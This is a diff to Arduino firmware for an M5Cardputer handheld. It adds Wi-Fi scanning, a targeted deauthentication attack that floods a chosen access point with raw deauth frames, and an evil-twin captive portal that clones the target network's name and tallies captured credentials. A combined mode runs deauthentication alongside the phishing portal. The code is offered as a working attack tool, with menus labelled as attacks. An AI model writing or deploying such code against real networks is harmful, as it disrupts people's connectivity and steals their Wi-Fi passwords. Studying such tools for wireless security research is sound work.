@@ -7,11 +7,16 @@
 #include <M5Cardputer.h>
 #include <IRremoteESP8266.h>
 #include <IRsend.h>
+#include <DNSServer.h>
+#include <WebServer.h>
 
 #include "src/settings.h"
 #include "src/language.h"
 #include "src/infrared.h"
 #include "src/beacon.h"
+#include "src/deauth.h"
+#include "src/sd.h"
+#include "src/portal.h"
 
 IRsend irsend(IR_SEND_PIN);
 
@@ -57,12 +62,21 @@ Menu irTvMenu[] = {
 int irTvMenuSize = sizeof(irTvMenu) / sizeof(Menu);
 
 Menu wifiMenu[] = {
+  {TXT_WIFI_SCAN, 4},
   {TXT_WIFI_BEACON_FUNNY, 1},
   {TXT_WIFI_BEACON_FUNNY_BR, 2},
   {TXT_BEACON_ATTACK_RND, 3},
   {TXT_BACK, 0},
 };
 int wifiMenuSize = sizeof(wifiMenu) / sizeof(Menu);
+
+Menu wifiAttackMenu[] = {
+  {TXT_WIFI_PORTAL, 0},
+  {TXT_WIFI_DEAUTH, 1},
+  {TXT_WIFI_COMBINED, 2},
+  {TXT_BACK, 5},
+};
+int wifiAttackMenuSize = sizeof(wifiAttackMenu) / sizeof(Menu);
 
 QrCode qrMenu[] = {
   {"Saturn", "https://youtu.be/dzNvk80XY9s"},
@@ -84,7 +98,7 @@ Menu settingsMenu[] = {
 
 void drawMenu(Menu thisMenu[], int size) {
   DISPLAY.fillScreen(BG_COLOR);
-  DISPLAY.setTextSize(2);
+  DISPLAY.setTextSize(MEDIUM_TEXT);
   DISPLAY.setTextColor(BG_COLOR);
   int y = HEIGHT_MENU_ITEMS;
   // Scrolling menu
@@ -346,7 +360,7 @@ void wifiMenuLoop() {
     isSwitching = true;
     switch(option) {
       case 0:
-        currentProc = 1;
+        currentProc = 1;  // Back
         break;
       case 1:
         beaconType = 1;
@@ -357,8 +371,460 @@ void wifiMenuLoop() {
       case 3:
         beaconType = 3;
         break;
+      case 4:
+        currentProc = 22;  // wi-Fi Scan
+        break;
     }
   }
+}
+
+void wifiScanDrawMenu() {
+  char ssid[19];
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setTextSize(MEDIUM_TEXT);
+  DISPLAY.setTextColor(BG_COLOR);
+  int y = HEIGHT_MENU_ITEMS;
+
+  if (cursor > 3) {
+    for (int i = 0 + (cursor - 3); i < wifict; i++) {
+      if (cursor == i) {
+        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+        DISPLAY.setTextColor(BG_COLOR);
+      } else {
+        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+        DISPLAY.setTextColor(MAIN_COLOR);
+      }
+      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+      DISPLAY.setCursor(20, y + 16);
+      if(WiFi.SSID(i).length() > 18){
+        WiFi.SSID(i).toCharArray(ssid, 19);
+        DISPLAY.print(ssid);
+      }else{
+        DISPLAY.print(WiFi.SSID(i));
+      }
+      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+    }
+
+    // Rescan
+    if (cursor == wifict) {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+      DISPLAY.setTextColor(BG_COLOR);
+    } else {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+      DISPLAY.setTextColor(MAIN_COLOR);
+    }
+    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+    DISPLAY.setCursor(20, y + 16);
+    DISPLAY.print(TXT_WIFI_RESCAN);
+    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+
+    // Back
+    if (cursor == wifict + 1) {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+      DISPLAY.setTextColor(BG_COLOR);
+    } else {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+      DISPLAY.setTextColor(MAIN_COLOR);
+    }
+    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+    DISPLAY.setCursor(20, y + 16);
+    DISPLAY.print(TXT_BACK);
+    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+  } else {
+    for (int i = 0; i < wifict; i++) {
+      if (cursor == i) {
+        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+        DISPLAY.setTextColor(BG_COLOR);
+      } else {
+        DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+        DISPLAY.setTextColor(MAIN_COLOR);
+      }
+      DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+      DISPLAY.setCursor(20, y + 16);
+      if(WiFi.SSID(i).length() > 18){
+        WiFi.SSID(i).toCharArray(ssid, 19);
+        DISPLAY.print(ssid);
+      }else{
+        DISPLAY.print(WiFi.SSID(i));
+      }
+      y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+    }
+
+    // Rescan
+    if (cursor == wifict) {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+      DISPLAY.setTextColor(BG_COLOR);
+    } else {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+      DISPLAY.setTextColor(MAIN_COLOR);
+    }
+    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+    DISPLAY.setCursor(20, y + 16);
+    DISPLAY.print(TXT_WIFI_RESCAN);
+    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+
+    // Back
+    if (cursor == wifict + 1) {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Highlight the current menu item
+      DISPLAY.setTextColor(BG_COLOR);
+    } else {
+      DISPLAY.fillRoundRect(5, y, DISPLAY.width() - 10, 30, 10, BG_COLOR);
+      DISPLAY.setTextColor(MAIN_COLOR);
+    }
+    DISPLAY.drawRoundRect(5, y, DISPLAY.width() - 10, 30, 10, MAIN_COLOR); // Draw the border of the menu item
+    DISPLAY.setCursor(20, y + 16);
+    DISPLAY.print(TXT_BACK);
+    y += SPACING_MENU_ITEMS; // Move to the next position for the next menu item
+  }
+}
+
+void wifiScanResultSetup() {
+  cursor = 0;
+  rstOverride = true;
+  wifiScanDrawMenu();
+  delay(500);
+}
+
+void wifiScanResultLoop(){
+  if (checkNextPress()) {
+    cursor++;
+    cursor = cursor % ( wifict + 2);
+    wifiScanDrawMenu();
+    delay(250);
+  }
+  if (checkSelectPress()) {
+    delay(250);
+    if(cursor == wifict){
+      rstOverride = false;
+      currentProc = 22;
+    }
+    if(cursor == wifict + 1){
+      rstOverride = false;
+      isSwitching = true;
+      currentProc = 20;
+    }
+    String encryptType = "";
+    switch (WiFi.encryptionType(cursor)) {
+    case 1:
+      encryptType = "WEP";
+      break;
+    case 2:
+      encryptType = "WPA/PSK/TKIP";
+      break;
+    case 3:
+      encryptType = "WPA/PSK/CCMP";
+      break;
+    case 4:
+      encryptType = "WPA2/PSK/Mixed/CCMP";
+      break;
+    case 8:
+      encryptType = "WPA/WPA2/PSK";
+      break ;
+    case 0:
+      encryptType = TXT_WIFI_OPEN;
+      break ;
+    }
+    DISPLAY.fillScreen(BG_COLOR);
+    DISPLAY.setCursor(0, 0);
+    DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
+    if(WiFi.SSID(cursor).length() > 12){
+      DISPLAY.setTextSize(SMALL_TEXT);
+    }else if(WiFi.SSID(cursor).length() > 20){
+      DISPLAY.setTextSize(MEDIUM_TEXT);
+    }else{
+      DISPLAY.setTextSize(MEDIUM_TEXT);
+    }
+    DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+    DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+    DISPLAY.setTextColor(BG_COLOR);
+    DISPLAY.drawString(WiFi.SSID(cursor), DISPLAY_CENTER_X, 20);
+    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+    DISPLAY.setTextSize(1.5);
+
+    int y_info = 50;
+
+    String frequency;
+
+    int numberChannel = WiFi.channel(cursor);
+
+    switch (numberChannel)
+    {
+    case 1:
+      frequency = "2412 MHz";
+      break;
+    case 2:
+      frequency = "2417 MHz";
+      break;
+    case 3:
+      frequency = "2422 MHz";
+      break;
+    case 4:
+      frequency = "2427 MHz";
+      break;
+    case 5:
+      frequency = "2432 MHz";
+      break;
+    case 6:
+      frequency = "2437 MHz";
+      break;
+    case 7:
+      frequency = "2442 MHz";
+      break;
+    case 8:
+      frequency = "2447 MHz";
+      break;
+    case 9:
+      frequency = "2452 MHz";
+      break;
+    case 10:
+      frequency = "2457 MHz";
+      break;
+    case 11:
+      frequency = "2462 MHz";
+      break;
+    case 12:
+      frequency = "2467 MHz";
+      break;
+    case 13:
+      frequency = "2472 MHz";
+      break;
+    case 14:
+      frequency = "2484 MHz";
+      break;
+    }
+
+    String channel = TXT_WIFI_CHANNEL + String(numberChannel) + " - " + frequency;
+    String crypt = TXT_WIFI_CRYPT + encryptType;
+    String bssid = "MAC: " + WiFi.BSSIDstr(cursor);
+    String signal = TXT_WIFI_SIGNAL + String(WiFi.RSSI(cursor)) + "dBm";
+
+    String infos[4] = {channel, crypt, bssid, signal};
+
+    for (int i = 0; i < 4; i++) {
+      DISPLAY.drawString(infos[i], DISPLAY_CENTER_X, y_info);
+      y_info += 15;
+    }
+
+    DISPLAY.setCursor(0, 100);
+    DISPLAY.setTextColor(BLACK);
+
+    DISPLAY.fillRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
+    DISPLAY.drawRoundRect(5, 110, DISPLAY.width() - 10, 20, 10, RED);
+    DISPLAY.drawString(TXT_HOLD_ATTACK, DISPLAY_CENTER_X, 120);
+
+    // DISPLAY.printf(" %-19s\n", TXT_HOLD_ATTACK);
+    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+   if(checkSelectPress()){
+      apMac=WiFi.BSSIDstr(cursor);
+      apSsidName=WiFi.SSID(cursor);
+      channel = static_cast<uint8_t>(WiFi.channel(cursor));
+      uint8_t* bssid = WiFi.BSSID(cursor);
+      memcpy(ap_record.bssid, bssid, 6);
+      rstOverride = false;
+      currentProc = 23;
+      isSwitching = true;
+      delay(100);
+    }
+  }
+}
+
+void wifiScanSetup() {
+  rstOverride = false;  
+  cursor = 0;
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setTextSize(LARGE_TEXT);
+  DISPLAY.drawString(TXT_WIFI_SCAN_1, DISPLAY_CENTER_X, 50);
+  DISPLAY.drawString(TXT_WIFI_SCAN_2, DISPLAY_CENTER_X, 90);
+  delay(1000);
+}
+
+void wifiScanLoop(){
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setTextSize(MEDIUM_TEXT);
+  DISPLAY.drawString(TXT_WIFI_SACANNING, DISPLAY_CENTER_X, 70);
+  wifict = WiFi.scanNetworks();
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setTextSize(SMALL_TEXT);
+  DISPLAY.setCursor(0, 0);
+  if(wifict > 0){
+    isSwitching = true;
+    currentProc=24;
+  }
+}
+
+void wifiAttackMenuSetup() {
+  cursor = 0;
+  rstOverride = true;
+  drawMenu(wifiAttackMenu, wifiAttackMenuSize);
+  delay(500);
+}
+
+void wifiAttackMenuLoop() {
+  if (checkNextPress()) {
+    cursor++;
+    cursor = cursor % wifiAttackMenuSize;
+    drawMenu(wifiAttackMenu, wifiAttackMenuSize);
+    delay(250);
+  }
+  if (checkSelectPress()) {
+    int option = wifiAttackMenu[cursor].command;
+    rstOverride = false;
+    currentProc = 23;
+    isSwitching = true;
+    switch(option) {
+      case 0:
+        rstOverride = false;
+        isSwitching = true;
+        clone_flg=true;
+        target_deauth_flg=false;
+        currentProc = 25;  // TODO -> PORTAL
+        break;
+      case 1:
+        rstOverride = false;
+        isSwitching = true;
+        target_deauth_flg=false;
+        target_deauth=true;
+        currentProc = 26;
+        break;
+      case 2:
+        rstOverride = false;
+        isSwitching = true;
+        clone_flg=true;
+        target_deauth_flg=true;
+        target_deauth=true;
+        currentProc = 25;
+        break;
+      case 5:
+        currentProc = 20;
+        break;
+    }
+  }
+}
+
+void deauthSetup(){
+  // Start the Access point service as Hidden
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(apSsidName, emptyString, channel, 1, 4, false);
+  IPAddress apIP = WiFi.softAPIP();
+
+
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setCursor(0, 0);
+  DISPLAY.setTextSize(LARGE_TEXT);
+  DISPLAY.setTextColor(RED, BG_COLOR);
+  DISPLAY.println("Deauth Atk");
+  DISPLAY.setTextSize(SMALL_TEXT);
+  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+  DISPLAY.print("\nSSID: " + apSsidName);
+  DISPLAY.print("\n");
+  DISPLAY.printf(TXT_WF_CHANN, channel);
+  DISPLAY.print("> " + apMac);
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  wsl_bypasser_send_deauth_frame(&ap_record, channel);
+
+  cursor = 0;
+  rstOverride = false;
+  delay(500); // Prevent switching after menu loads up
+}
+
+void deauthLoop(){
+  if (target_deauth == true) {
+    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    DISPLAY.setTextSize(SMALL_TEXT);
+    DISPLAY.setTextColor(RED, BG_COLOR);
+    DISPLAY.setCursor(1, 115);
+    DISPLAY.println(TXT_DEAUTH_STOP);
+    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+  } else{
+    DISPLAY.setTextSize(SMALL_TEXT);
+    DISPLAY.setTextColor(RED, BG_COLOR);
+    DISPLAY.setCursor(1, 115);
+    DISPLAY.println(TXT_DEAUTH_START);
+    DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+  }
+
+  delay(100);
+
+  if (checkSelectPress()){
+    target_deauth = !target_deauth;
+    DISPLAY.setCursor(1, 115);
+    DISPLAY.println("......................");
+    delay(500);
+  }
+
+  if (checkNextPress()){
+    WiFi.mode(WIFI_MODE_STA);
+    rstOverride = false;
+    isSwitching = true;
+    target_deauth = false;
+    currentProc = 20;
+    delay(500);
+  }
+}
+
+// -=-=-= CAPITIVE PORTAL =-=-=-
+
+void portalSetup(){
+  setupWiFi();
+  setupWebServer();
+  portalActive = true;
+  cursor = 0;
+  rstOverride = true;
+  printHomeToScreen();
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  wsl_bypasser_send_deauth_frame(&ap_record, channel);
+  delay(500);
+}
+
+void portalLoop(){
+  if ((millis() - lastTick) > PortalTickTimer) {
+    lastTick = millis();
+    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
+      previousTotalCapturedCredentials = totalCapturedCredentials;
+      printHomeToScreen();
+    }
+  }
+  if (clone_flg==true) {
+    if (target_deauth_flg) {
+      if (target_deauth == true) {
+        if (deauth_tick==35) {
+          wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+          deauth_tick=0;
+        } else { 
+          deauth_tick=deauth_tick+1; 
+        }
+        DISPLAY.setTextSize(SMALL_TEXT);
+        DISPLAY.setTextColor(RED, BG_COLOR);
+        DISPLAY.setCursor(1, 115);
+        DISPLAY.println(TXT_DEAUTH_STOP);
+        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+      } else{
+        DISPLAY.setTextSize(SMALL_TEXT);
+        DISPLAY.setTextColor(RED, BG_COLOR);
+        DISPLAY.setCursor(1, 115);
+        DISPLAY.println(TXT_DEAUTH_START);
+        DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+      }
+      if (checkSelectPress()){
+        target_deauth = !target_deauth;
+        delay(500);
+      }
+    }
+  }
+
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  
+  if (checkNextPress()){
+    shutdownWebServer();
+    portalActive = false;
+    target_deauth_flg = false;
+    target_deauth = false;
+    clone_flg = false;
+    currentProc = 20;
+    delay(500);
+  }
+  checkSelectPress();
 }
 
 // -=-=-= BEACON =-=-=-
@@ -720,7 +1186,7 @@ void setup() {
 // 3 - Settings
 // 4 - IR Devices
 // 5 - IR TV
-// 23 - Wi-Fi Beacon
+// 21 - Wi-Fi Beacon
 
 void loop() {
   // Background processes
@@ -754,6 +1220,21 @@ void loop() {
       case 21:
         wifiBeaconSetup();
         break;
+      case 22:
+        wifiScanSetup();
+        break;
+      case 23:
+        wifiAttackMenuSetup();
+        break;
+      case 24:
+        wifiScanResultSetup();
+        break;
+      case 25:
+        portalSetup();
+        break;
+      case 26:
+        deauthSetup();
+        break;
     }
   }
 
@@ -781,6 +1262,21 @@ void loop() {
       break;
     case 21:
       wifiBeaconLoop();
+      break;
+    case 22:
+      wifiScanLoop();
+      break;
+    case 23:
+      wifiAttackMenuLoop();
+      break;
+    case 24:
+      wifiScanResultLoop();
+      break;
+    case 25:
+      portalLoop();
+      break;
+    case 26:
+      deauthLoop();
       break;
   }
 }
